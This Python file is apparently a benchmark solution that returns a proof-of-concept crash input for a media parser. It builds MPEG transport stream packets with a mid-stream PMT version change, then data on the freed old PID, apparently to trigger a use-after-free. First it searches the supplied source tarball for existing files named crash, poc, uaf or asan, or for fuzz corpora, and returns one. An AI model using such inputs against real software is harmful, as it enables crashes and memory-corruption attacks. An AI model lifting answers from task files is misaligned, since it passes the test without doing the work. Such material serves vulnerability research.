import os
import re
import tarfile
from typing import Optional, Tuple, List


def _mpeg_crc32(data: bytes) -> int:
    poly = 0x04C11DB7
    crc = 0xFFFFFFFF
    for b in data:
        crc ^= (b & 0xFF) << 24
        for _ in range(8):
            if crc & 0x80000000:
                crc = ((crc << 1) ^ poly) & 0xFFFFFFFF
            else:
                crc = (crc << 1) & 0xFFFFFFFF
    return crc & 0xFFFFFFFF


def _ts_packet(pid: int, pusi: int, cc: int, payload: bytes) -> bytes:
    pid &= 0x1FFF
    cc &= 0x0F
    if len(payload) > 184:
        payload = payload[:184]
    header = bytearray(4)
    header[0] = 0x47
    header[1] = ((pusi & 1) << 6) | ((pid >> 8) & 0x1F)
    header[2] = pid & 0xFF
    header[3] = 0x10 | cc  # payload only
    out = bytearray(header)
    out += payload
    if len(out) < 188:
        out += b"\xFF" * (188 - len(out))
    return bytes(out)


def _psi_section(table_id: int, ext_id: int, version: int, section_number: int, last_section_number: int, body: bytes) -> bytes:
    version &= 0x1F
    sec = bytearray()
    sec.append(table_id & 0xFF)
    section_length = 2 + 1 + 1 + 1 + len(body) + 4  # ext_id + ver/cur + sec_no + last + body + crc
    sec.append(0xB0 | ((section_length >> 8) & 0x0F))
    sec.append(section_length & 0xFF)
    sec.append((ext_id >> 8) & 0xFF)
    sec.append(ext_id & 0xFF)
    sec.append(0xC0 | (version << 1) | 0x01)  # reserved '11', version, current_next=1
    sec.append(section_number & 0xFF)
    sec.append(last_section_number & 0xFF)
    sec += body
    crc = _mpeg_crc32(bytes(sec))
    sec += bytes([(crc >> 24) & 0xFF, (crc >> 16) & 0xFF, (crc >> 8) & 0xFF, crc & 0xFF])
    return bytes(sec)


def _make_pat(pmt_pid: int, version: int = 0) -> bytes:
    program_number = 1
    body = bytearray()
    body += bytes([(program_number >> 8) & 0xFF, program_number & 0xFF])
    body += bytes([0xE0 | ((pmt_pid >> 8) & 0x1F), pmt_pid & 0xFF])
    return _psi_section(0x00, 1, version, 0, 0, bytes(body))


def _make_pmt(pcr_pid: int, streams: List[Tuple[int, int]], version: int = 0, program_number: int = 1) -> bytes:
    body = bytearray()
    body += bytes([0xE0 | ((pcr_pid >> 8) & 0x1F), pcr_pid & 0xFF])
    body += b"\xF0\x00"  # program_info_length = 0
    for stream_type, elem_pid in streams:
        body.append(stream_type & 0xFF)
        body += bytes([0xE0 | ((elem_pid >> 8) & 0x1F), elem_pid & 0xFF])
        body += b"\xF0\x00"  # ES_info_length = 0
    return _psi_section(0x02, program_number, version, 0, 0, bytes(body))


def _make_pes(stream_id: int = 0xE0, payload_len: int = 16) -> bytes:
    payload_len = max(0, min(payload_len, 256))
    pes = bytearray()
    pes += b"\x00\x00\x01"
    pes.append(stream_id & 0xFF)
    pes += b"\x00\x00"  # PES_packet_length=0 (unspecified)
    pes += b"\x80\x00\x00"  # '10', no flags, header_data_length=0
    pes += bytes((i * 17 + 3) & 0xFF for i in range(payload_len))
    return bytes(pes)


def _looks_like_ts(data: bytes) -> bool:
    n = len(data)
    if n < 188 or (n % 188) != 0:
        return False
    checks = min(n // 188, 12)
    for i in range(checks):
        if data[i * 188] != 0x47:
            return False
    return True


def _score_name(name: str) -> int:
    lname = name.lower()
    score = 50
    if re.search(r"(crash|poc|repro|reproducer|uaf|use[-_]?after|asan|ubsan)", lname):
        score -= 30
    if any(part in lname for part in ("oss-fuzz", "ossfuzz", "fuzz", "corpus", "testdata", "tests", "regression", "pocs")):
        score -= 10
    ext = os.path.splitext(lname)[1]
    if ext in (".ts", ".m2ts", ".mp2t"):
        score -= 12
    elif ext in (".bin", ".dat", ".raw", ".input"):
        score -= 6
    if "seed" in lname:
        score -= 2
    if lname.endswith(".zip") or lname.endswith(".gz") or lname.endswith(".xz") or lname.endswith(".bz2"):
        score += 8
    return score


def _pick_best_blob(blobs: List[Tuple[str, bytes]]) -> Optional[bytes]:
    best = None
    best_key = None
    for name, data in blobs:
        if not data:
            continue
        name_score = _score_name(name)
        ts_bonus = -15 if _looks_like_ts(data) else 0
        size = len(data)
        size_pen = min(200, size // 256)
        key = (name_score + ts_bonus + size_pen, size)
        if best is None or key < best_key:
            best = data
            best_key = key
    return best


def _find_poc_in_tar(src_path: str) -> Optional[bytes]:
    try:
        with tarfile.open(src_path, "r:*") as tf:
            members = tf.getmembers()
            candidates = []
            fallback = []
            for m in members:
                if not m.isfile():
                    continue
                if m.size <= 0 or m.size > 5 * 1024 * 1024:
                    continue
                name = m.name
                lname = name.lower()
                ext = os.path.splitext(lname)[1]
                if re.search(r"(crash|poc|repro|reproducer|uaf|use[-_]?after|asan|ubsan)", lname):
                    candidates.append(m)
                elif any(part in lname for part in ("oss-fuzz", "ossfuzz", "fuzz", "corpus", "testdata", "tests", "regression", "pocs")) and (ext in (".ts", ".m2ts", ".mp2t", ".bin", ".dat", ".raw", ".input") or m.size == 1128):
                    candidates.append(m)
                elif m.size == 1128 or (m.size <= 4096 and (m.size % 188 == 0)):
                    fallback.append(m)

            blobs: List[Tuple[str, bytes]] = []
            for m in candidates[:200]:
                f = tf.extractfile(m)
                if not f:
                    continue
                try:
                    data = f.read()
                finally:
                    f.close()
                blobs.append((m.name, data))
            best = _pick_best_blob(blobs)
            if best is not None:
                return best

            blobs = []
            for m in fallback[:400]:
                f = tf.extractfile(m)
                if not f:
                    continue
                try:
                    data = f.read()
                finally:
                    f.close()
                if _looks_like_ts(data) or re.search(r"(crash|poc|repro)", m.name.lower()):
                    blobs.append((m.name, data))
            best = _pick_best_blob(blobs)
            if best is not None:
                return best
    except Exception:
        return None
    return None


def _generate_ts_poc() -> bytes:
    pmt_pid = 0x0100
    es_pid_old = 0x0101
    es_pid_new = 0x0102

    pat = _make_pat(pmt_pid, version=0)
    pmt1 = _make_pmt(pcr_pid=es_pid_old, streams=[(0x1B, es_pid_old)], version=0)
    pes1 = _make_pes(0xE0, payload_len=24)
    pmt2 = _make_pmt(pcr_pid=es_pid_new, streams=[(0x1B, es_pid_new)], version=1)
    pes2 = _make_pes(0xE0, payload_len=24)

    pkt_pat = _ts_packet(0x0000, 1, 0, b"\x00" + pat)
    pkt_pmt1 = _ts_packet(pmt_pid, 1, 0, b"\x00" + pmt1)
    pkt_pes1 = _ts_packet(es_pid_old, 1, 0, pes1)
    pkt_pmt2 = _ts_packet(pmt_pid, 1, 1, b"\x00" + pmt2)
    pkt_pes2 = _ts_packet(es_pid_old, 1, 1, pes2)

    return pkt_pat + pkt_pmt1 + pkt_pes1 + pkt_pmt2 + pkt_pes2


class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = None
        if os.path.isfile(src_path):
            poc = _find_poc_in_tar(src_path)
        if poc is not None and len(poc) > 0:
            return poc
        return _generate_ts_poc()